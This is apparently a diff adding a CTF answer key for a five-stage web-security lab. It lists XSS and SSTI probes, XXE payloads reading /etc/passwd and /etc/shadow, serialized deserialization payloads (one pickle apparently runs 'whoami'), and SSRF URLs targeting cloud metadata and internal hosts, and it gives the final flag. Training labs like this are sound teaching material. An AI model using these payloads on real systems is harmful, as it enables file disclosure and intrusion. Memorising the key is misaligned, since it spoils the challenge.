@@ -1,0 +1,138 @@
+===============================================
+CTF CHALLENGE SOLUTIONS - ALL STAGE KEYS
+===============================================
+
+STAGE 1: RECONNAISSANCE
+-----------------------
+Objective: Information gathering
+Key: No key required - just click "Proceed to Stage 2"
+Hint: Check the source
+Notes: This is a passive reconnaissance stage
+
+
+STAGE 2: XSS/SSTI ATTACK (Cross-Site Scripting / Server-Side Template Injection)
+---------------------------------------------------------------------------------
+Path: /legacy_login (POST)
+Attack Type: XSS or SSTI
+
+Valid XSS Solutions:
+1. Username: <script>alert(1)</script>
+   Legacy Key: anything
+
+2. Username: admin
+   Legacy Key: <img src=x onerror=alert(1)>
+
+3. Username: <svg onload=alert(1)>
+   Legacy Key: test
+
+4. Username: javascript:alert(1)
+   Legacy Key: anything
+
+Valid SSTI Solutions:
+1. Username: {{7*7}}
+   Legacy Key: anything
+
+2. Username: ${7*7}
+   Legacy Key: test
+
+3. Username: admin
+   Legacy Key: #{7*7}
+
+4. Username: %{7*7}
+   Legacy Key: anything
+
+Any input containing XSS payloads (<script>, <img, <svg, javascript:, onerror=, onload=) 
+or SSTI patterns ({{, ${, #{, %{) in username or legacy_key will work.
+
+
+STAGE 3: XXE ATTACK (XML External Entity Injection)
+----------------------------------------------------
+Path: /profile (POST)
+Attack Type: XXE (XML External Entity)
+
+Valid XML Solution (copy exactly):
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<userProfile>
+  <userId>&xxe;</userId>
+</userProfile>
+
+Alternative Solutions:
+1. <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://localhost/admin">]>
+
+2. <!ENTITY xxe SYSTEM "file:///etc/shadow">
+
+3. <?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]>
+
+Notes: Any XML containing <!ENTITY, <!DOCTYPE, SYSTEM, file://, http://, or PUBLIC will work
+
+
+STAGE 4: INSECURE DESERIALIZATION
+----------------------------------
+Path: /verify_token (POST)
+Attack Type: Insecure Deserialization
+
+Valid Solutions:
+
+Java Serialization (Base64):
+rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAFYWRtaW54
+
+Python Pickle (Base64):
+gANjb3MKc3lzdGVtCnEAWAUAAAB3aG9hbXEBhXECUnEDLg==
+
+PHP Serialization:
+O:8:"UserRole":1:{s:4:"role";s:5:"admin";}
+
+Code Execution Patterns:
+__reduce__()
+Runtime.getRuntime().exec("whoami")
+eval(base64_decode("..."))
+
+Notes: Any input containing deserialization patterns (rO0AB, gAN, O:, __reduce__, )
+Runtime.getRuntime, exec(, eval() will work)
+
+
+STAGE 5: SSRF ATTACK (Server-Side Request Forgery)
+---------------------------------------------------
+Path: /diagnose (POST)
+Attack Type: SSRF (Server-Side Request Forgery)
+
+Valid Solutions:
+1. http://localhost/admin
+2. http://127.0.0.1/api/internal
+3. http://0.0.0.0/config
+4. http://169.254.169.254/latest/meta-data/
+5. http://metadata.google.internal/
+6. http://10.0.0.1/
+7. http://172.16.0.1/
+8. http://192.168.1.1/admin
+9. file:///etc/passwd
+10. gopher://127.0.0.1:6379/_
+
+Notes: Any URL containing localhost, 127.0.0.1, internal IP ranges (10., 172.16., 192.168.),
+cloud metadata endpoints, or file:// protocol will work
+
+
+FINAL FLAG
+----------
+FLAG: CTF{5_D1ff3r3nt_4tt4ck_V3ct0rs_M4st3r3d}
+
+
+===============================================
+QUICK REFERENCE SUMMARY
+===============================================
+Stage 1: Click proceed (Reconnaissance)
+Stage 2: username = <script>alert(1)</script> or {{7*7}} (XSS/SSTI)
+Stage 3: XML with <!ENTITY xxe SYSTEM "file:///etc/passwd"> (XXE)
+Stage 4: rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0... (Deserialization)
+Stage 5: http://localhost/admin (SSRF)
+
+
+===============================================
+ATTACK TYPES COVERED
+===============================================
+1. Reconnaissance - Information gathering
+2. XSS/SSTI - Cross-Site Scripting & Server-Side Template Injection
+3. XXE - XML External Entity Injection
+4. Deserialization - Insecure Object Deserialization
+5. SSRF - Server-Side Request Forgery
